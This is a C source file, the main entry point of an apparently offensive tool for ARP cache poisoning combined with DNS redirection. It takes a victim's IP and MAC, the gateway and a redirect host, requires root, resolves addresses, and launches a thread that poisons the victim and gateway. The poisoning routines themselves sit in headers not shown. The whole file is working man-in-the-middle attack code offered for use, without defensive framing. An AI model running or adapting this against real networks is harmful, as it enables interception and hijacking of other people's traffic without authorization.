#include <getopt.h>
#include <pthread.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "addr.h"
#include "poison.h"

static void print_help() {
    puts("* - required arguments\n"
         "\n==>target<==\n"
         "\t*[p]snip - the host of the target to poison\n"
         "\t[P]snmac - the MAC of the target to poison [disables auto discovery]\n"
         "\t[g]ateip - the IP of the gateway, will default to local routing lookup\n"
         "\t[G]atemac - the MAC of the gateway [disables auto discovery]\n"
         "\t[l]ocalmac - the MAC of this device, will default to local routing lookup [disables "
         "auto discovery]\n"
         "\n==>injection<==\n"
         "\t*[i]nterface - the interface to use\n"
         "\t*[d]stip - the host of the crafted dns query, will default to local IP\n"
         "one or the other is needed but not both\n"
         "\n==>misc<==\n"
         "\t[h]elp - this message");
}

int main(int argc, char **argv) {
    if (setuid(0) || setgid(0)) {
        perror("setuid setguid requires root");
        return EXIT_FAILURE;
    }

    int choice;
    int option_index = 0;

    char *dstip  = NULL;
    char *gateip = NULL;
    char *psnip  = NULL;
    char *iface  = NULL;

    uint32_t pip;
    uint32_t uip;
    uint32_t dip;
    uint32_t gip;

    //extra bit is a flag for if its been set or not
    uint8_t umac[7];
    umac[6] = 0;
    uint8_t pmac[7];
    pmac[6] = 0;
    uint8_t gmac[7];
    gmac[6] = 0;

    if (argc == 1) {
        print_help();
        return EXIT_SUCCESS;
    }

    while (1) {
        static struct option long_options[] = {
                {"psnip",     required_argument, 0, 'p'},
                {"psnmac",    required_argument, 0, 'P'},
                {"gateip",    required_argument, 0, 'g'},
                {"gatemac",   required_argument, 0, 'G'},
                {"localmac",  required_argument, 0, 'l'},
                {"interface", required_argument, 0, 'i'},
                {"dstip",     required_argument, 0, 'd'},
                {"help",      no_argument,       0, 'h'},
                {0, 0, 0, 0}
            };

        choice = getopt_long(argc, argv, "p:P:g:G:l:i:d:h", long_options, &option_index);

        if (choice == -1) {
            break;
        }

        switch (choice) {
            case 'h':
                print_help();
                return EXIT_SUCCESS;
            case 'i':
                iface = optarg;
                break;
            case 'l':
                if (read_mac_str(optarg, umac)) {
                    fputs("failed to read in local MAC\n", stderr);
                    return EXIT_FAILURE;
                }
                umac[6] = 1;
                break;
            case 'g':
                gateip = optarg;
                break;
            case 'G':
                if (read_mac_str(optarg, gmac)) {
                    fputs("failed to read in gateway MAC\n", stderr);
                    return EXIT_FAILURE;
                }
                gmac[6] = 1;
                break;
            case 'p':
                psnip = optarg;
                break;
            case 'P':
                if (read_mac_str(optarg, pmac)) {
                    fputs("failed to read in poison MAC\n", stderr);
                    return EXIT_FAILURE;
                }
                pmac[6] = 1;
                break;
            case 'd':
                dstip = optarg;
                break;
            default:
                print_help();
                return EXIT_FAILURE;
        }
    }
    if (!psnip || !dstip) {
        fputs("please specify both poison and target\n", stderr);
        print_help();
        return EXIT_FAILURE;
    }

    if (!iface) {
        fputs("please specify an interface\n", stderr);
        return EXIT_FAILURE;
    }

    if (resolve_ip(psnip, &pip)) {
        fputs("unable to resolve poison IP\n", stderr);
        return EXIT_FAILURE;
    }

    if (resolve_ip(dstip, &dip)) {
        fputs("unable to resolve dest IP\n", stderr);
        return EXIT_FAILURE;
    }

    if (gateip) {
        if (resolve_ip(gateip, &gip)) {
            fputs("unable to resolve gateway IP\n", stderr);
            return EXIT_FAILURE;
        }
    } else {
        if (resolve_gateway(&gip)) {
            fputs("unable to resolve gateway IP\n", stderr);
            return EXIT_FAILURE;
        }
    }

    if (!umac[6] && resolve_local_mac(iface, umac)) {
        fputs("unable to resolve local MAC\n", stderr);
        return EXIT_FAILURE;
    }

    if (resolve_local_ip(umac, &uip)) {
        fputs("unable to resolve local IP\n", stderr);
        return EXIT_FAILURE;
    }

    if (!pmac[6] && resolve_remote_mac(pip, pmac)) {
        fputs("unable to resolve remote MAC\n", stderr);
        return EXIT_FAILURE;
    }

    if (!gmac[6] && resolve_remote_mac(gip, gmac)) {
        fputs("unable to resolve gateway MAC\n", stderr);
        return EXIT_FAILURE;
    }

    puts("==-poison-==");
    print_ip(pip);
    print_mac(pmac);

    puts("==-redirect to-==");
    print_ip(dip);

    puts("==-us-==");
    print_ip(uip);
    print_mac(umac);

    puts("==-gateway-==");
    print_ip(gip);
    print_mac(gmac);

    puts("==-starting poison-==");
    targets_t tg;
    tg.sock = peep_sock(iface);
    tg.gip  = gip;
    tg.cip  = pip;
    memcpy(tg.omac, umac, 6);
    memcpy(tg.cmac, pmac, 6);
    memcpy(tg.gmac, gmac, 6);

    pthread_t td;

    pthread_create(&td, NULL, zerg_arp, &tg);

    void *ret = NULL;
    pthread_join(td, &ret);
    return EXIT_SUCCESS;
}
